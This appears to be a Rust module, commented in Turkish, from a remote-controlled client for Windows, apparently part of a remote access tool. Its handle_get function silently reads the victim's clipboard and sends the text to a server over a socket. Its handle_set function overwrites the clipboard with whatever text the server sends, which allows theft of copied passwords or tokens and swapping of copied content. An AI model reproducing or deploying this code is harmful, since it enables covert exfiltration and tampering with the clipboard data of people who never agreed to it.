// clipboardmanager.rs
// Clipboard okuma ve yazma — sıfır harici bağımlılık.
// Win32 API fonksiyonları extern "system" ile doğrudan çağrılır.
// Build: cargo build --release  (Cargo.toml'a ek bir satır gerekmez)

#![allow(non_snake_case, non_camel_case_types)]

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use crate::{send, Sock};

// ─── Win32 tip takma adları ───────────────────────────────
type HANDLE  = *mut std::ffi::c_void;
type HGLOBAL = *mut std::ffi::c_void;
type HWND    = *mut std::ffi::c_void;
type BOOL    = i32;
type UINT    = u32;

const CF_UNICODETEXT: UINT = 13;
const GMEM_MOVEABLE:  UINT = 0x0002;
const NULL_HWND:      HWND = std::ptr::null_mut();

// ─── Win32 bağlamaları ────────────────────────────────────
#[link(name = "user32")]
extern "system" {
    fn OpenClipboard(hWndNewOwner: HWND) -> BOOL;
    fn CloseClipboard() -> BOOL;
    fn EmptyClipboard() -> BOOL;
    fn GetClipboardData(uFormat: UINT) -> HANDLE;
    fn SetClipboardData(uFormat: UINT, hMem: HANDLE) -> HANDLE;
}

#[link(name = "kernel32")]
extern "system" {
    fn GlobalAlloc(uFlags: UINT, dwBytes: usize) -> HGLOBAL;
    fn GlobalFree(hMem: HGLOBAL) -> HGLOBAL;
    fn GlobalLock(hMem: HGLOBAL) -> *mut std::ffi::c_void;
    fn GlobalUnlock(hMem: HGLOBAL) -> BOOL;
}

// ─── Public API ───────────────────────────────────────────

/// Clipboard içeriğini okur; sunucuya `[clipboard_result]<metin>` gönderir.
pub fn handle_get(sock: &Sock) {
    match read_clipboard() {
        Ok(text) => {
            // Protokol tek satır → newline'ları escape et
            let normalized = text
                .replace('\r', "")
                .replace('\n', "\\n");
            send(sock, &format!("[clipboard_result]{}", normalized));
        }
        Err(e) => {
            send(sock, &format!("[clipboard_result]ERR:{}", e));
        }
    }
}

/// Sunucudan gelen metni clipboard'a yazar.
/// Sonucu `[clipboard_set_result]ok` veya `[clipboard_set_result]ERR:...` olarak bildirir.
pub fn handle_set(sock: &Sock, text: &str) {
    let decoded = text.replace("\\n", "\n");
    match write_clipboard(&decoded) {
        Ok(()) => send(sock, "[clipboard_set_result]ok"),
        Err(e) => send(sock, &format!("[clipboard_set_result]ERR:{}", e)),
    }
}

// ─── Dahili yardımcılar ───────────────────────────────────

fn read_clipboard() -> Result<String, String> {
    unsafe {
        if OpenClipboard(std::ptr::null_mut()) == 0 {
            return Err("OpenClipboard başarısız".into());
        }

        let h = GetClipboardData(CF_UNICODETEXT);
        if h.is_null() {
            CloseClipboard();
            return Ok(String::new());
        }

        let ptr = GlobalLock(h as HGLOBAL);
        if ptr.is_null() {
            CloseClipboard();
            return Err("GlobalLock başarısız".into());
        }

        let wide_ptr = ptr as *const u16;
        let mut len = 0usize;
        while *wide_ptr.add(len) != 0 {
            len += 1;
        }
        let wide_slice = std::slice::from_raw_parts(wide_ptr, len);
        let text = String::from_utf16_lossy(wide_slice);

        GlobalUnlock(h as HGLOBAL);
        CloseClipboard();
        Ok(text)
    }
}

fn write_clipboard(text: &str) -> Result<(), String> {
    let wide: Vec<u16> = OsStr::new(text)
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect();
    let byte_len = wide.len() * std::mem::size_of::<u16>();

    unsafe {
        if OpenClipboard(std::ptr::null_mut()) == 0 {
            return Err("OpenClipboard başarısız".into());
        }

        if EmptyClipboard() == 0 {
            CloseClipboard();
            return Err("EmptyClipboard başarısız".into());
        }

        let h_global = GlobalAlloc(GMEM_MOVEABLE, byte_len);
        if h_global.is_null() {
            CloseClipboard();
            return Err("GlobalAlloc başarısız".into());
        }

        let dst = GlobalLock(h_global) as *mut u16;
        if dst.is_null() {
            GlobalFree(h_global);
            CloseClipboard();
            return Err("GlobalLock başarısız".into());
        }

        ptr::copy_nonoverlapping(wide.as_ptr(), dst, wide.len());
        GlobalUnlock(h_global);

        if SetClipboardData(CF_UNICODETEXT, h_global as HANDLE).is_null() {
            GlobalFree(h_global);
            CloseClipboard();
            return Err("SetClipboardData başarısız".into());
        }

        // Başarıda GlobalFree çağırma: SetClipboardData sahipliği devraldı
        CloseClipboard();
        Ok(())
    }
}